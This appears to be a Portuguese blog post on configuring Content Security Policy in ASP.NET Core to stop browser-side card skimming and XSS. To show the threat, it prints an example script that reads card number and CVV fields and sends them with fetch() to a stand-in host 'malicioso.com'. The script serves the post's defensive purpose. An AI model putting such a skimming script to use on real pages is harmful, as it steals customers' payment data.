---
title: "Content Security Policy no ASP.NET: a camada invisível que protege os dados do seu cliente"
description: "Seu backend pode estar seguro, mas o navegador não. Veja como o CSP bloqueia roubo de dados, XSS e ataques como o Magecart diretamente no ASP.NET Core."
pubDate: 2026-02-07
tags: ["asp.net", "aspnetcore", "seguranca", "csp", "aspnetpro"]
---

Se você trabalha com e-commerce, sistemas financeiros ou qualquer aplicação que manipule dados sensíveis, existe uma ameaça silenciosa que pode comprometer tudo — mesmo quando seu backend está perfeitamente seguro.

Essa ameaça roda no navegador do usuário.

E é exatamente aqui que entra o Content Security Policy (CSP).

## Seu backend pode estar seguro, mas o navegador não

Imagine uma página de checkout com campos de cartão de crédito:

```html
<input name="cardNumber" />
<input name="cvv" />
```

Agora imagine que, por algum motivo, um script malicioso é executado nessa página:

```js
fetch("https://malicioso.com/steal", {
  method: "POST",
  body: JSON.stringify({
    card: document.querySelector("[name=cardNumber]").value,
    cvv: document.querySelector("[name=cvv]").value
  })
});
```

Esse script pode ter vindo de:

- uma extensão maliciosa do navegador
- um malware no computador do usuário
- uma biblioteca comprometida
- um XSS não detectado
- um CDN comprometido
- uma injeção via third-party script

E o pior: se não houver proteção, o navegador permite isso.

Mesmo com HTTPS. Mesmo com backend seguro. Mesmo com autenticação forte.

## O que é Content Security Policy (CSP)

O Content Security Policy é um mecanismo de segurança que permite definir exatamente quais recursos o navegador pode carregar e executar.

Ele funciona como uma whitelist. Tudo que não estiver permitido é bloqueado automaticamente pelo navegador.

Ele é configurado via header HTTP:

```
Content-Security-Policy: default-src 'self';
```

Isso significa: só permita carregar recursos do próprio domínio. Qualquer script externo será bloqueado.

## O que o CSP protege na prática

Ele bloqueia:

- Scripts maliciosos
- Scripts injetados via XSS
- Scripts de extensões maliciosas (na maioria dos casos)
- Exfiltração de dados
- Injeção de iframes maliciosos
- Execução de código não autorizado

Isso é fundamental em páginas como checkout, login, cadastro, alteração de senha e área autenticada.

## O ataque real em e-commerce: Magecart

Um dos ataques mais comuns em e-commerce é o Magecart. Ele injeta um script na página de checkout que faz exatamente isso:

```js
document.querySelector("form").addEventListener("submit", function() {
  // envia dados do cartão para servidor do atacante
});
```

O usuário conclui a compra normalmente, mas o cartão foi roubado. Isso já aconteceu com British Airways, Ticketmaster, Newegg e milhares de lojas menores.

**Com CSP corretamente configurado, esse ataque é bloqueado automaticamente.**

## Como implementar CSP no ASP.NET Core (Razor Pages ou MVC)

A forma mais simples é adicionar o header no middleware.

**Program.cs:**

```csharp
app.Use(async (context, next) =>
{
    context.Response.Headers["Content-Security-Policy"] =
        "default-src 'self'; " +
        "script-src 'self'; " +
        "style-src 'self' 'unsafe-inline'; " +
        "img-src 'self' data:; " +
        "font-src 'self'; " +
        "connect-src 'self'; " +
        "frame-src 'self'; " +
        "object-src 'none'; " +
        "base-uri 'self'; " +
        "form-action 'self';";

    await next();
});
```

Isso já cria uma proteção extremamente forte.

## Explicando cada diretiva

| Diretiva | O que faz |
|---|---|
| `default-src 'self'` | Tudo só pode vir do próprio domínio |
| `script-src 'self'` | Bloqueia scripts externos não autorizados |
| `connect-src 'self'` | Bloqueia envio de dados para servidores externos |
| `form-action 'self'` | Impede envio de formulários para outros domínios |
| `object-src 'none'` | Bloqueia plugins antigos e perigosos |
| `frame-src 'self'` | Evita iframes maliciosos |

## Isso impede roubo de cartão na prática

Se um malware tentar executar:

```js
fetch("https://malicioso.com/steal", {...});
```

O navegador bloqueia automaticamente. O request nunca acontece. O dado nunca sai do navegador. Mesmo que o script exista.

## Caso real: integração com gateway de pagamento

Em e-commerce, você normalmente precisa liberar o gateway. Exemplo com Stripe:

```csharp
context.Response.Headers["Content-Security-Policy"] =
    "default-src 'self'; " +
    "script-src 'self' https://js.stripe.com; " +
    "frame-src https://js.stripe.com; " +
    "connect-src 'self' https://api.stripe.com;";
```

Isso permite apenas o Stripe. Todo o resto é bloqueado.

## CSP é essencial para compliance e segurança moderna

Se você busca PCI Compliance, segurança enterprise, proteção contra Magecart, proteção contra XSS ou proteção de dados sensíveis — CSP não é opcional. É obrigatório.

Grandes players utilizam CSP rigoroso: Amazon, Stripe, Microsoft, Google.

## Razor Pages ou MVC: funciona igual

Não importa se sua aplicação é Razor Pages, MVC, Minimal API ou Blazor. CSP é aplicado via header HTTP. O navegador faz o resto.

## CSP protege mesmo quando o backend falha

Firewalls protegem o servidor. CSP protege o navegador. É a última linha de defesa.

E no e-commerce, essa linha pode ser a diferença entre uma venda e um incidente de segurança.

## Conclusão

Se sua aplicação manipula dados sensíveis e não utiliza Content Security Policy, ela está vulnerável. Não é questão de "se". É questão de "quando".

CSP é simples de implementar e fornece uma camada de proteção extremamente poderosa contra roubo de dados, XSS e scripts maliciosos.

É uma das features de segurança mais subestimadas do ASP.NET e da web moderna — e deveria ser padrão em qualquer aplicação séria.
